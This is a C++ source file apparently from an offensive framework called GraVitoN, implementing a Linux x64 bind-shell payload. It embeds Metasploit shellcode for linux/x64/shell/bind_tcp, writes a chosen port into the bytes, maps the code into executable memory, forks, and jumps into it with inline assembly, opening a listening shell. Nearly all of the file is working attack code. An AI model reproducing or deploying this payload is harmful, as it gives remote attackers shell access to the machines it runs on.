/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Payload_Linux64b
 * 
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_LINUX64B_HEAD_
#define _GVN_PAYLOAD_LINUX64B_HEAD_

#include "../gvn_payload.hpp"

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>

using namespace GraVitoN;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief A bind shell for linux x64
 *
 */
class Payload_Linux64b : public GraVitoN::Bin_Payload
{
protected:
	virtual bool initPayload();
	
public:
	/// Constructor
    Payload_Linux64b();

	/// Destructor
    virtual ~Payload_Linux64b();

	/**
	 * @brief Initialize
	 *
	 * @param [in] _options
	 * Listening Port ( "Port=7357" )
	 * 
	 */
    virtual bool initialize ( const string &_options );

	/// @see Payload::run()
	virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Linux64b::Payload_Linux64b()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Linux64b::~Payload_Linux64b()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Linux64b::initPayload()
{
    int port = 7357;
	/// Parse options
	OptParser::getValueAsInt(options, "PORT", port);

	/**
	* linux/x64/shell/bind_tcp - 78 bytes (stage 1) \n
	* http://www.metasploit.com \n
	* VERBOSE=false, LPORT=4444, PrependSetresuid=false, \n
	* PrependSetreuid=false, PrependSetuid=false, \n
	* PrependChrootBreak=false, AppendExit=false, \n
	* InitialAutoRunScript=, AutoRunScript= \n
	*/
	unsigned char buf[] =
	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
	"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
	"\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
	"\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
	"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
	"\x05\xff\xe6";

	/// Change port number
	unsigned char up = port / 256, down = port % 256;
	buf[20] = up;
	buf[21] = down;
	int buf_len = 78;

    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Linux64b::initialize ( const string &_options )
{
    options = _options;

    Logger::logIt ( "init payload... " );
    initPayload();
    Logger::logItLn ( "done" );

	/// Copy payload to heap and set RWX permisson 
    // jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
	/// During my linux tests, I discoverd that mmap is better than mprotect
	jumper = ( void ( * ) ( void* ) ) mmap( 0, payload_size,
											PROT_READ | PROT_WRITE | PROT_EXEC,
											MAP_SHARED | MAP_ANONYMOUS,
											-1, 0 );
	
    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Linux64b::run()
{
	/// Fork
    Logger::logItLn ("Forking...");
	int pid = fork();
	
	
	/// If i'm child process
	if ( pid == 0 )
	{
		/*
		/// Set Page Permissions
		unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
		if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
			Logger::logIt ( "mprotect failed - errorno: " );
			Logger::logItLn ( errno );

			return false;
		}
		*/
		
		/// A Little Delay!
		int _delay = 320;
		while ( _delay > 0 ) {
			--_delay;
		}

		/// Jumping to starting address of payload
		
		int useless_out = 0;
		Logger::logItLn ( "Jumping on Payload..." );
		asm (
			"mov %1, %%rbx;"
			"jmp *%%rbx;"
			: "=r" ( useless_out )
			: "r" ( jumper )
			: "%rbx"
		);
		
		exit(0);
	}
	
	/// While Child is runnig
	while( waitpid(pid, NULL, 0) > 0 )
		sleep(0.01);
	
	Logger::logItLn ( "call > done" );
    return true;
}


#endif // _GVN_PAYLOAD_LINUX64B_HEAD_
